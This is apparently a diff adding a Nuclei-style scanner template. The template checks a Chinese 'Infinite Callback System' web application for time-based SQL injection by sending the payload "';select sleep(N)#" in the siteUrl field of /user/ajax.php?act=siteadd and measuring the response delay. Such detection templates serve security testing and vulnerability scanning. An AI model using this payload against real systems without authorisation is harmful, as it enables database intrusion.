@@ -1,0 +1,53 @@
+id: poc-yaml-infinite-callback-system-siteUrl-sqli
+info:
+  name: 无限回调系统 siteUrl SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: "{{rand_int(5,10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+flow: http(1) && http(2)
+
+http:
+  - id: check-login-page
+    method: GET
+    path:
+      - "{{BaseURL}}/user/login.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "无限回调系统"
+
+  - id: test-sqli
+    method: POST
+    path:
+      - "{{BaseURL}}/user/ajax.php?act=siteadd"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "siteUrl=';select sleep({{t1}})#"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"code\":0"
+      - type: word
+        part: body
+        negative: true
+        words:
+          - "<"
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
